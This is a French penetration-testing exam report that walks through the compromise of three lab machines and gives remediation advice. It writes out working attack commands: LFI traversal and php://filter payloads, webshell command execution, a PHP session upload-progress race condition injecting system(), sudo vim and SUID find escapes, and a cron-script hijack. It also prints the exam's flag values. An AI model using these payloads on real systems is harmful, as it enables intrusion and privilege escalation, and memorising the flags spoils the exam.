1. Introduction et portée de l'engagement

Ce rapport documente l'évaluation pratique réalisée dans le cadre de la certification ThunderCipher Certified VAPT Practitioner (TC-VAPT), examen #1, hébergé sur la plateforme thundercipher.in. L'environnement d'examen comprenait trois machines cibles indépendantes (« Vault », « UploadX », « Phantom »), accessibles uniquement via le VPN OpenVPN fourni par la plateforme (réseau interne 192.168.5.0/24).

Conformément au règlement de l'examen, l'objectif était, pour chaque machine : obtenir un accès initial, élever les privilèges jusqu'à root, et capturer les deux flags (user et root) au format ThunderCipher{...}. L'attaque a été strictement limitée au périmètre du lab (adresses 192.168.5.0/24 routées par le VPN de l'examen) ; aucun système hors de ce périmètre n'a été testé.

Toutes les actions décrites ci-dessous ont été exécutées depuis un poste Kali Linux relié au lab par le tunnel OpenVPN officiel de la plateforme (interface tun0, adresse attribuée 10.8.0.57).

5. Cible 1 — Vault (192.168.5.249)

« L'organisation estime son coffre-fort interne sécurisé. Cependant, des audits récents suggèrent une possible exposition de données de configuration sensibles. »

5.1 Reconnaissance

Scan de ports

$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.249
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Le port 80 héberge une application PHP (Apache/2.4.63 Ubuntu) présentant un formulaire de connexion « Vault • Secure Access » (champs username / password, cookie PHPSESSID).

5.2 Identification de la vulnérabilité

Des tentatives de bypass par injection SQL sur le formulaire de login se sont révélées infructueuses (requêtes probablement paramétrées). L'énumération ciblée de chemins sensibles a révélé un répertoire /backup/ avec listing de répertoire activé, exposant un fichier de sauvegarde de code source :

$ curl -s http://192.168.5.249/backup/
Index of /backup
...
<a href="config.php.bak">config.php.bak</a>   2026-03-19 13:28   58

$ curl -s http://192.168.5.249/backup/config.php.bak
<?php
$db_user = "admin";
$db_pass = "SuperSecure123";
?>
Vulnérabilité : CWE-530 (Exposure of Backup File to an Unauthorized Control Sphere) combinée à CWE-548 (Exposure of Information Through Directory Listing). Un fichier de sauvegarde .bak contenant des identifiants en clair est accessible publiquement sans authentification.

5.3 Exploitation — Accès initial

Les identifiants extraits (admin / SuperSecure123) sont réutilisés à la fois pour le portail web et pour le compte système admin via SSH (mauvaise pratique de réutilisation de mot de passe) :

$ curl -s -c cj.txt -X POST http://192.168.5.249/ \
    --data-urlencode "username=admin" --data-urlencode "password=SuperSecure123"
HTTP/1.1 302 Found
Location: /index.php   → Authentification web réussie

$ ssh admin@192.168.5.249   (mot de passe: SuperSecure123)
uid=1000(admin) gid=1000(admin) groups=1000(admin),100(users)

$ cat ~/user.txt
ThunderCipher{vault_user_9f3a7c2d8b1e_secureaccess}

5.4 Élévation de privilèges — Root

L'énumération sudo -l révèle une règle NOPASSWD sur l'éditeur vim, une technique d'évasion documentée sur GTFOBins (exécution d'une commande shell depuis l'éditeur avec les privilèges de sudo) :

$ sudo -l
User admin may run the following commands on hodabalo207:
    (ALL) NOPASSWD: /usr/bin/vim

$ sudo vim -c ':!cat /root/root.txt' -c ':q!' -c ':q!'
ThunderCipher{vault_root_a81c92ff7e6d_fullcompromise}
Chaîne d'exploitation résumée — Vault :
  1. Découverte de /backup/ ouvert au listing (énumération de contenu).
  2. Lecture de config.php.bak → identifiants admin:SuperSecure123.
  3. Authentification réussie sur le portail web et en SSH (réutilisation de mot de passe).
  4. Capture du flag utilisateur.
  5. sudo -l → NOPASSWD sur vim → évasion GTFOBins vers un shell root.
  6. Capture du flag root.

Recommandations de remédiation

• Désactiver le listing de répertoire Apache (Options -Indexes) et retirer tout fichier de sauvegarde (.bak, ~, .old) du webroot en production.
• Ne jamais stocker d'identifiants en clair dans le code source ; utiliser un gestionnaire de secrets / variables d'environnement.
• Interdire la réutilisation d'un même mot de passe entre l'application web et les comptes système.
• Retirer la règle sudo NOPASSWD: /usr/bin/vim ou la restreindre à des commandes précises sans échappement shell (voir GTFOBins pour la liste des binaires dangereux en sudo).

6. Cible 2 — UploadX (192.168.5.119)

« UploadX est une plateforme de partage de fichiers utilisée par les employés. Des préoccupations de sécurité ont été soulevées concernant des mécanismes de validation d'entrée incorrects. »

6.1 Reconnaissance

$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.119
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

La page d'accueil est une landing page statique contenant un commentaire HTML révélateur : <!-- TODO: Remove dev upload endpoint before production -->.

6.2 Identification de la vulnérabilité

Une sonde ciblée sur les chemins liés à l'upload révèle /upload.php et surtout un dossier /uploads/ avec listing de répertoire activé, exposant deux fichiers PHP déjà déposés (résidus d'un accès antérieur / webshell pré-existant) :

$ curl -s http://192.168.5.119/uploads/
Index of /uploads
<a href="credential.php">credential.php</a>   259
<a href="file.php">file.php</a>                31

file.php s'est révélé être un webshell minimal acceptant une commande via le paramètre GET cmd, exécutable sans authentification :

$ curl -s "http://192.168.5.119/uploads/file.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Vulnérabilité : CWE-306 (Missing Authentication for Critical Function) — Remote Code Execution non authentifiée (webshell accessible publiquement) + CWE-548 (directory listing) ayant permis de le découvrir.

6.3 Exploitation — Accès initial

Via le RCE, lecture du second fichier exposé (credential.php), qui contient un commentaire développeur avec des identifiants de sauvegarde :

$ curl -s -G "http://192.168.5.119/uploads/file.php" \
    --data-urlencode "cmd=cat /var/www/html/uploads/credential.php"
// Backup credentials for testing:
// Username: uploadx
// Password: UploadX@123
// NOTE: Remove before production deployment.

$ ssh uploadx@192.168.5.119   (mot de passe: UploadX@123)
uid=1000(uploadx) gid=1000(uploadx) groups=1000(uploadx),100(users)

$ cat ~/user.txt
ThunderCipher{uploadx_user_initial_access_7ac91e}

6.4 Élévation de privilèges — Root

sudo -l ne révèle aucun droit exploitable, mais l'énumération des binaires SUID montre que /usr/bin/find porte le bit SUID root — un vecteur GTFOBins classique :

$ find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/find        ← SUID root (-rwsr-x--- root uploadx)
...

$ find /usr/bin/find -exec cat /root/root.txt \;
ThunderCipher{uploadx_root_full_system_control_a91f2c}
Chaîne d'exploitation résumée — UploadX :
  1. /uploads/ ouvert au listing → découverte d'un webshell (file.php?cmd=) et d'un fichier de notes développeur (credential.php).
  2. RCE non authentifiée confirmée (id → www-data).
  3. Lecture du code source de credential.php via le webshell → identifiants uploadx:UploadX@123.
  4. Connexion SSH, capture du flag utilisateur.
  5. find SUID root → évasion GTFOBins vers un shell root.
  6. Capture du flag root.

Recommandations de remédiation

• Supprimer tout fichier résiduel / webshell du dossier uploads/ et interdire l'exécution de PHP dans les dossiers d'upload (php_admin_flag engine off ou équivalent Apache/Nginx).
• Désactiver le listing de répertoire.
• Ne jamais laisser de commentaires contenant des identifiants dans le code livré en production.
• Retirer le bit SUID sur /usr/bin/find (il n'a aucune raison légitime de l'avoir) ; auditer régulièrement les binaires SUID du système avec find / -perm -4000.

7. Cible 3 — Phantom (192.168.5.237)

« Une activité suspecte a été détectée sur le serveur Phantom. Enquêter pour déterminer si un attaquant a établi une persistance dans le système. »

7.1 Reconnaissance

$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.237
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

L'application est un portail interne « Phantom Internal Portal » pilotant son contenu via un paramètre d'URL ?page=, avec un avertissement explicite dans l'interface : « Legacy file loader is still active in this build. »

7.2 Identification de la vulnérabilité — Local File Inclusion

Le paramètre page est directement passé à include() côté PHP, sans aucune validation ni restriction d'extension :

$ curl -s "http://192.168.5.237/?page=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

# Confirmation du code source via le wrapper php://filter :
$ curl -s "http://192.168.5.237/?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php"
   → décodé : $page = $_GET['page'] ?? 'home.php'; include($page);
Vulnérabilité : CWE-98 (PHP Local File Inclusion) — include($_GET['page']) sans sanitization ni liste blanche.

7.3 Exploitation — De la LFI au RCE (race condition)

L'exploitation directe en RCE via les wrappers data:// ou php://input a échoué (allow_url_include = Off confirmé par lecture du php.ini via LFI). Les journaux Apache (/var/log/apache2/*.log) classiquement utilisés pour le « log poisoning » se sont révélés illisibles par www-data (non membre du groupe adm).

L'exécution de code a finalement été obtenue via la technique de race condition sur session.upload_progress de PHP : un upload multipart lent contenant le payload PHP dans le champ spécial PHP_SESSION_UPLOAD_PROGRESS crée un fichier de session temporaire sur disque (/var/lib/php/sessions/sess_<id>), lisible par le même utilisateur www-data ; une requête LFI parallèle inclut ce fichier pendant la fenêtre où l'upload est encore en cours :

$ python3 race_lfi.py "id"
[Thread 1] POST multipart lent, Cookie: PHPSESSID=evilsess,
           champ PHP_SESSION_UPLOAD_PROGRESS = <?php system($_GET["c"]); ?>
[Thread 2] GET /?page=/var/lib/php/sessions/sess_evilsess&c=id   (répété en boucle)

=== GOT OUTPUT ===
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Le flag utilisateur est directement lisible malgré les permissions restrictives du dossier /home/phantom (bit d'exécution sans lecture, traversable si le nom de fichier est connu) :

$ (via RCE) cat /home/phantom/user.txt
ThunderCipher{phantom_lfi_to_ssh_access_gained_7f3a9c2d8e1b}

7.4 Investigation de persistance & Élévation de privilèges — Root

Conformément à l'énoncé du challenge (« déterminer si un attaquant a établi une persistance »), l'inspection de /etc/crontab révèle une tâche root exécutée chaque minute pointant vers un script aux permissions excessives :

$ (via RCE) cat /etc/crontab
* * * * * root /opt/backup.sh

$ (via RCE) ls -la /opt/backup.sh
-rwxrwxrwx 1 root root 54 Mar 19 2026 /opt/backup.sh      ← monde-inscriptible !
$ cat /opt/backup.sh
#!/bin/bash
tar -czf /tmp/backup.tar.gz /home/phantom

Un script exécuté par root toutes les minutes, modifiable par n'importe quel utilisateur (y compris www-data), constitue une escalade de privilèges triviale. Une première tentative via un binaire SUID déposé dans /tmp a échoué silencieusement (/tmp est monté nosuid) ; le script a été réécrit pour exfiltrer directement le flag root via /opt (hors de /tmp, donc non soumis à nosuid) :

$ (via RCE) cat > /opt/backup.sh <<'EOF'
#!/bin/bash
cat /root/root.txt > /opt/out.txt 2>&1; chmod 666 /opt/out.txt
EOF
# ... attente du prochain déclenchement cron (< 60s) ...
$ (via LFI) curl -s "http://192.168.5.237/?page=/opt/out.txt"
ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e}

Après capture de la preuve, le script /opt/backup.sh a été restauré à son contenu d'origine et les fichiers temporaires déposés (/opt/out.txt, /tmp/rootbash) ont été supprimés, conformément aux bonnes pratiques de nettoyage post-exploitation.

Chaîne d'exploitation résumée — Phantom :
  1. LFI non authentifiée découverte via le paramètre page (include() sans filtrage).
  2. Lecture de fichiers système (/etc/passwd) et du code source applicatif (php://filter) pour confirmer la faille et la configuration PHP.
  3. allow_url_include=Off et logs Apache illisibles → wrappers classiques et log poisoning inopérants.
  4. RCE obtenue par race condition sur session.upload_progress → exécution de commandes en www-data.
  5. Capture du flag utilisateur (lecture directe, malgré permissions restrictives du home).
  6. Découverte d'un cron root toutes les minutes exécutant un script monde-inscriptible (/opt/backup.sh) — preuve d'une faiblesse de configuration exploitable comme vecteur de persistance.
  7. Détournement du script pour exfiltrer /root/root.txt (contournement du montage nosuid de /tmp en écrivant hors de ce point de montage).
  8. Capture du flag root ; nettoyage des artefacts déposés.

Recommandations de remédiation

• Ne jamais passer une entrée utilisateur non filtrée à include()/require() ; utiliser une liste blanche stricte de pages autorisées.
• Désactiver allow_url_fopen si non nécessaire, et garder allow_url_include=Off (bonne pratique déjà en place ici, mais insuffisante seule).
• Restreindre les permissions de tout script exécuté par cron en tant que root (propriétaire root, chmod 700, dossier parent non inscriptible par d'autres utilisateurs).
• Auditer périodiquement /etc/crontab et /etc/cron.d/ pour détecter les tâches root pointant vers des fichiers aux permissions excessives (vecteur de persistance classique pour un attaquant).
• Envisager session.upload_progress.enabled=Off si la fonctionnalité n'est pas utilisée par l'application.

Les trois environnements partagent un schéma commun : une faiblesse de configuration web relativement mineure en apparence (listing de répertoire, paramètre non filtré) sert de point d'entrée, et l'escalade de privilèges repose systématiquement sur une erreur de configuration système locale (sudoers trop permissif, SUID superflu, script root inscriptible par tous) plutôt que sur une faille du noyau ou un exploit complexe. Ce constat souligne l'importance d'un durcissement systématique post-déploiement (CIS Benchmarks, audits réguliers des permissions sudo/SUID/cron), indépendamment de la robustesse de la couche applicative.

L'ensemble des objectifs de l'examen ThunderCipher Certified VAPT Practitioner (TC-VAPT) #1 a été atteint : les trois machines mises à disposition (Vault, UploadX, Phantom) ont été compromises de bout en bout, avec obtention de l'accès initial, élévation de privilèges jusqu'à root, et capture des six flags (trois utilisateur, trois root) requis par le règlement.
